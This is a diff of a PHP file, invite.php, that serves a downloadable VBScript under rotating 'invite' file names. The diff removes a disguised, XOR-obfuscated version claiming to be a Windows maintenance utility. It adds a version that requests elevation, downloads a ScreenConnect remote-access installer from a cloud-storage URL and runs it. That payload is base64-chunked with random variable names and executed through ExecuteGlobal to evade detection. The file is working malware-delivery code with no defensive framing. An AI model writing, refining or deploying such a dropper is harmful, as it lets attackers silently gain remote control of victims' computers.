@@ -1,5 +1,5 @@
 <?php
-// invite.php - Benign header + No Persistence + No Defender Exclusion
+// invite.php - Generates already-encoded VBS
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
@@ -15,7 +15,6 @@ $used = isset($_COOKIE[$cookieName]) ? json_decode($_COOKIE[$cookieName], true) 
 if (!is_array($used)) $used = [];
 
 $available = array_diff($baseNames, $used);
-
 if (empty($available)) {
     $available = $baseNames;
     $used = [];
@@ -30,58 +29,12 @@ setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 
 
 header('Content-Disposition: attachment; filename="' . $chosen . '"');
 
-$scUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";
-
-$sessionId = bin2hex(random_bytes(24));
-$ts = time();
-$randV1 = 'v' . substr(md5(random_bytes(8)), 0, 12);
-$xorKey = rand(100, 255);
-
-$junkLines = rand(5, 25);
-$junk = "";
-for ($i = 0; $i < $junkLines; $i++) {
-    $junk .= "' Junk " . bin2hex(random_bytes(rand(6, 14))) . "\n";
-}
-
-echo <<<VBS
-' ========================================================
-' Windows System Maintenance Utility
-' Version: 3.1.8
-' Description: Performs routine system health checks,
-' applies recommended configuration updates, and ensures
-' optimal performance on Windows 10 and Windows 11.
-' Compatible with standard user and elevated environments.
-' ========================================================
-' This script is intended for legitimate system maintenance
-' purposes only. It does not collect personal data.
-' ========================================================
-
-' Configuration section - do not modify
-Const SCRIPT_VERSION = "3.1.8"
-Const LOG_ENABLED = False
-
-' Placeholder for future expansion
-Dim configReady
-configReady = True
-
-' End of configuration header
-' ========================================================
-
-Dim $randV1, objShell, objFSO
+// ===== YOUR REAL VBS CODE HERE =====
+$realVbs = <<<'REAL'
+Dim objShell, objFSO
 Set objShell = CreateObject("WScript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
-$randV1 = "$sessionId"
-
-Function D(s)
-    Dim i, r : r = ""
-    For i = 1 To Len(s)
-        r = r & Chr(Asc(Mid(s, i, 1)) Xor $xorKey)
-    Next
-    D = r
-End Function
-
-' ===== ELEVATION =====
 If WScript.Arguments.Length = 0 Then
     Dim shell
     Set shell = CreateObject("Shell.Application")
@@ -92,8 +45,8 @@ End If
 Sub DownloadAndExecute()
     On Error Resume Next
     Dim u, p, http, strm
-    u = "$scUrl"
-    p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")
+    u = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi"
+    p = objShell.ExpandEnvironmentStrings("%TEMP%\sc_setup.msi")
   
     Set http = CreateObject("MSXML2.XMLHTTP")
     http.Open "GET", u, False
@@ -107,10 +60,41 @@ Sub DownloadAndExecute()
     End If
 End Sub
 
-' ===== MAIN =====
 Call DownloadAndExecute
-
-$junk
 WScript.Quit
-VBS;
+REAL;
+
+// ===== ENCODING LOGIC (same as your PowerShell) =====
+$chunkSize = 100;
+$base64 = base64_encode($realVbs);
+$len = strlen($base64);
+$count = ceil($len / $chunkSize);
+
+$vbs = "Option Explicit\r\n";
+$vbs .= "Dim vuliri(" . ($count - 1) . ")\r\n";
+
+for ($i = 0; $i < $count; $i++) {
+    $start = $i * $chunkSize;
+    $chunk = substr($base64, $start, $chunkSize);
+    $vbs .= "vuliri($i) = \"$chunk\"\r\n";
+}
+
+$vbs .= "\r\nDim ojofofi : ojofofi = Join(vuliri, \"\")\r\n";
+$vbs .= "ExecuteGlobal ahokehuho(ojofofi)\r\n\r\n";
+$vbs .= "Function ahokehuho(s)\r\n";
+$vbs .= " Dim cihozot, alemi, nd\r\n";
+$vbs .= " Set cihozot = CreateObject(\"Msxml2.DOMDocument.6.0\")\r\n";
+$vbs .= " Set nd = cihozot.createElement(\"b\")\r\n";
+$vbs .= " nd.dataType = \"bin.base64\"\r\n";
+$vbs .= " nd.text = s\r\n";
+$vbs .= " Set alemi = CreateObject(\"ADODB.Stream\")\r\n";
+$vbs .= " alemi.Type = 1 : alemi.Open\r\n";
+$vbs .= " alemi.Write nd.nodeTypedValue\r\n";
+$vbs .= " alemi.Position = 0\r\n";
+$vbs .= " alemi.Type = 2 : alemi.Charset = \"UTF-8\"\r\n";
+$vbs .= " ahokehuho = alemi.ReadText\r\n";
+$vbs .= " alemi.Close\r\n";
+$vbs .= "End Function\r\n";
+
+echo $vbs;
 ?>
